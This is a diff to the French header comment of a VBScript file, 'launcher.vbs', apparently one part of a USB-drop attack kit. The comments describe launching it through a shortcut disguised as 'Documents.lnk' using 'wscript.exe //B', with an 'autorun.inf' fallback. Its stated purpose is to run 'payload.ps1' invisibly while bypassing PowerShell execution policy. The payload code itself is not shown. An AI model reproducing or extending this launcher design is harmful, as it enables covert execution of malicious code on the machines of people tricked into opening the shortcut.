@@ -1,7 +1,14 @@
 ' ============================================================
 ' launcher.vbs – Lanceur silencieux (Partie 1)
-' Exécute payload.ps1 en arrière-plan, sans fenêtre visible,
-' avec bypass de la politique d'exécution PowerShell.
+'
+' Déclenchement principal : double-clic sur Documents.lnk
+'   wscript.exe //B "D:\launcher.vbs"
+'
+' Déclenchement de repli (systèmes anciens) : autorun.inf
+'   open=launcher.vbs
+'
+' Rôle : exécuter payload.ps1 en arrière-plan, sans aucune
+'         fenêtre visible, avec bypass de la politique PS.
 ' ============================================================
 Option Explicit
 
